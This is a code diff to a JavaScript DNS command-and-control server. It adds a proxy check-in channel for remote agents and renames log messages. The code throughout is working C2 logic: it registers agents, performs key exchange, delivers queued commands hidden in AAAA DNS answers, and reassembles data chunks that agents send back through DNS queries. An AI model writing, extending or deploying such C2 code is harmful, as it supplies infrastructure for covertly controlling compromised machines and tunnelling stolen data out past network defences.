@@ -159,6 +159,14 @@ dns_server
 ui.info(`c2-dns listening on: ${rc.config.c2.dns_ip}:${rc.config.c2.dns_port}`);
 
 /**
+ * Start the proxy loop if it is enabled;
+ */
+if (rc.config.proxy.enabled) {
+    ui.info(`starting proxy checkin at interval: ${rc.config.proxy.interval}ms`);
+    rc.proxy_fetch_loop();
+}
+
+/**
  req: {
       connection: {
           remoteAddress: '127.0.0.1',
@@ -178,6 +186,7 @@ function c2_message_handler(req, res) {
     var question = res.question[0];
     var hostname = question.name;
     var ttl = 300; // Math.floor(Math.random() 3600)
+    let channel = question.type === "PROXY" ? "proxy" : "dns";
 
     if (typeof rc.config.static_dns[hostname] != "undefined") {
         ui.info(`static_dns: responding request for host: '${hostname}' with ip '${rc.config.static_dns[hostname]}'`);
@@ -194,16 +203,16 @@ function c2_message_handler(req, res) {
         ui.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
         return res.end();
     }
-    ui.debug(util.format("c2: %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));
+    ui.debug(util.format("query: %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));
 
     if (question.type !== "AAAA" && question.type !== "PROXY") {
-        ui.debug(util.format("c2: ignoring non-AAAA/non-PROXY query %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));
+        ui.debug(util.format("ignoring non-AAAA/non-PROXY query %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));
         return res.end();
     }
 
     var segments = hostname.slice(0, hostname.length - rc.config.c2.domain.length).split(".");
     if (segments.length < EXPECTED_DATA_SEGMENTS) {
-        ui.error(util.format("c2: invalid message, not enough data segments (%d, expected %d): %s", segments.length, EXPECTED_DATA_SEGMENTS, hostname));
+        ui.error(util.format("invalid message, not enough data segments (%d, expected %d): %s", segments.length, EXPECTED_DATA_SEGMENTS, hostname));
 
         return res.end();
     }
@@ -213,12 +222,12 @@ function c2_message_handler(req, res) {
 
     var agent_id = segments[1];
     if (rc.agents[agent_id] == null) {
-        rc.init_agent(agent_id);
-        ui.warn(`c2: first ping from agent ${chalk.blue(agent_id)}@${req.connection.remoteAddress}`);
+        rc.init_agent(agent_id, channel);
+        ui.warn(`first ping from agent ${chalk.blue(agent_id)}, src: ${req.connection.remoteAddress}, channel: ${rc.agents[agent_id].channel}`);
 
         if (!crypto.key) crypto.generate_keys();
 
-        ui.warn(`c2: keyx started with agent ${chalk.blue(agent_id)}`);
+        ui.warn(`keyx started with agent ${chalk.blue(agent_id)}`);
         rc.command_keyx(crypto.export_pubkey("uncompressed"), agent_id);
     }
     rc.agents[agent_id].lastseen = Math.floor(new Date() / 1000);
@@ -228,16 +237,21 @@ function c2_message_handler(req, res) {
     try {
         command = parseInt(segments[2].slice(0, 2), 16);
     } catch (ex) {
-        ui.error(`c2: failed to parse command: ${ex.message}`);
+        ui.error(`failed to parse command: ${ex.message}`);
 
         return res.end();
     }
 
     // no need to check the incoming data, just send a queued up msg
     if (command == rc.AGENT_CHECKIN) {
+        if (channel !== rc.agents[agent_id].channel) {
+            ui.warn(`agent ${chalk.blue(agent_id)} switching channel from ${rc.agents[agent_id].channel} to ${channel}`);
+            rc.agents[agent_id].channel = channel;
+        }
+
         if (rc.agents[agent_id].sendq.length == 0) {
             // 03 means no data to send
-            ui.debug(`${agent_id} checking in, no data to send`);
+            ui.debug(`agent ${agent_id} checking in, no data to send`);
             status = rc.make_ip_string("03");
             res.answer.push({
                 name: hostname,
@@ -257,12 +271,12 @@ function c2_message_handler(req, res) {
                 delete rc.agents[agent_id].ignore[rand_id];
             }, FLOOD_PROTECTION_TIMEOUT);
 
-            ui.warn(`c2: ignoring flood from agent: ${chalk.blue(agent_id)}, rid: ${rand_id}, command: ${command}`);
+            ui.warn(`ignoring flood from agent: ${chalk.blue(agent_id)}, rid: ${rand_id}, command: ${command}`);
 
             return res.end();
         }
 
-        ui.debug(`agent ${chalk.blue(agent_id)} checking in, sending next queued command`);
+        ui.debug(`agent ${agent_id} checking in, sending next queued command`);
         records = rc.agents[agent_id].sendq.shift();
         records.forEach((r) => {
             res.answer.push({
@@ -287,14 +301,14 @@ function c2_message_handler(req, res) {
         current_chunk = parseInt(segments[2].slice(2, 4), 16);
         total_chunks = parseInt(segments[2].slice(4, 6), 16);
     } catch (ex) {
-        return ui.error(`c2: invalid chunk numbers, current: ${current_chunk}, total: ${total_chunks}`);
+        return ui.error(`message: invalid chunk numbers, current: ${current_chunk}, total: ${total_chunks}`);
     }
 
     var data_id = segments[3];
-    if (data_id.length < 2) return ui.error(`c2: invalid data id: ${data_id}`);
+    if (data_id.length < 2) return ui.error(`message: invalid data id: ${data_id}`);
 
     var chunk = segments[4];
-    if (chunk.length < 2) return ui.error(`c2: invalid chunk: ${chunk}`);
+    if (chunk.length < 2) return ui.error(`message: invalid chunk: ${chunk}`);
 
     if (typeof rc.agents[agent_id].recvq[command] == "undefined") {
         rc.agents[agent_id].recvq[command] = {};
